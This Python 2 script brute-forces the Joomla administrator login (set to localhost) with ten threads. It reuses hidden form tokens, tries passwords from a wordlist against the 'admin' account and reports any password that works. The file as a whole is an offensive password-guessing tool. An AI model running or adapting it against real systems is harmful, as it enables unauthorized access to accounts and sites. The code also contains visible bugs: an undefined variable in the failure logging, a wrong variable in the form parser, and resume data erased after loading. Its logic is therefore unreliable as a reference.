import urllib2
import urllib
import cookielib
import threading
import sys
import Queue
from HTMLParser import HTMLParser

# general settings
user_thread = 10
username = "admin"
wordlist_file = "dict.txt"
resume = None

# target specific settings
target_url = "http://localhost/joomla/administrator/index.php"
target_post = "http://localhost/joomla/administrator/index.php"
username_field= "username"
password_field= "passwd"
success_check = "Configuration"

class Bruter(object):

	def __init__(self, username, words):
		self.username = username
		self.password_q = words
		self.found = False
		print "Finished setting up for: %s" % username

	def run_bruteforce(self):	
		for i in range(user_thread):
			t = threading.Thread(target=self.web_bruter)
			t.start()

	def web_bruter(self):
		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			
			# TODO : ADD PROXIE MOD
			jar = cookielib.FileCookieJar("cookies")
			opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
			
			response = opener.open(target_url)

			page = response.read()
			print "Trying: %s : %s " % (self.username,brute)

			# parse out the hidden fields
			parser = BruteParser()
			parser.feed(page)

			post_tags = parser.tag_results

			# add our username and password fields
			post_tags[username_field] = self.username
			post_tags[password_field] = brute

			login_data = urllib.urlencode(post_tags)
			login_response = opener.open(target_post, login_data)
			login_result = login_response.read()

			# write html response in a tmp file
			resultFile = open("response.tmp", "w")
			resultFile.write(login_result)
			resultFile.close()

			# Looking for unusual response
			resultFile = open("response.tmp", "r")
			cmpt = 0
			for line in resultFile:
				cmpt += 1
			resultFile.close()

			if(cmpt < 3):
				print "[-] Strange response for password: %s" % brute
				failPassword = open("strangePassword.txt", "a")
				failPassword.write(str(password)+"\n")
				failPassword.close()

			if success_check in login_result:
				self.found = True
				print "--------------------------"
				print "[*] Bruteforce successful."
				print "[*] Username: %s" % username
				print "[*] Password: %s" % brute
				print "[*] Waiting for other threads to exit..."


class BruteParser(HTMLParser):
	def __init__(self):
		HTMLParser.__init__(self)
		self.tag_results = {}

	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name,value in attrs:
				if name == "name":
					tag_name = value
				if name == "value":
					tag_value = value
			if tag_name is not None:
				self.tag_results[tag_name] = value



def load_dictionnary(dictName):
	"""
	return 10 password from dictName in a Queue object.
	write last password sent in the password.tmp file.
	"""
	lastPassowrdTested = 0
	listOfPassword = []

	# get the last password tested
	tmpFile = open("password.tmp", "r")
	cmpt = 0
	for line in tmpFile:
		lineWithoutBackN = line.split("\n")
		lineWithoutBackN = lineWithoutBackN[0]
		lastPassowrdTested = lineWithoutBackN
		cmpt += 1
	tmpFile.close()

	# Create the password list
	cmpt2 = 0
	dictionnary = open(dictName, "r")
	if(cmpt == 0):
		for line in dictionnary:
			lineWithoutBackN = line.split("\n")
			lineWithoutBackN = lineWithoutBackN[0]
			password = lineWithoutBackN
			if(len(listOfPassword) < 10):
				listOfPassword.append(password)
			cmpt2 += 1
	else:
		record = 0
		for line in dictionnary:
			lineWithoutBackN = line.split("\n")
			lineWithoutBackN = lineWithoutBackN[0]
			password = lineWithoutBackN
			if(record):
				if(len(listOfPassword) < 10):
					listOfPassword.append(password)
			if(password == lastPassowrdTested):
				record = 1
				cmpt2 += 1
	dictionnary.close()

	# write last password tested for next pass
	tmpFile = open("password.tmp", "w")
	if(len(listOfPassword) > 0):
		tmpFile.write(listOfPassword[-1])
	tmpFile.close()

	# convert into Queue
	queryQ = Queue.Queue()
	words = [queryQ.put(query) for query in listOfPassword]

	return queryQ

def clean():
	"""
	IN PROGRESS
	-> init tmp file
	"""
	tmpFile = open("password.tmp", "w")
	tmpFile.close()

	strangePassword = open("strangePassword.txt", "w")
	strangePassword.close()

words = load_dictionnary("dict.txt")

# Run the Attack
clean()
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
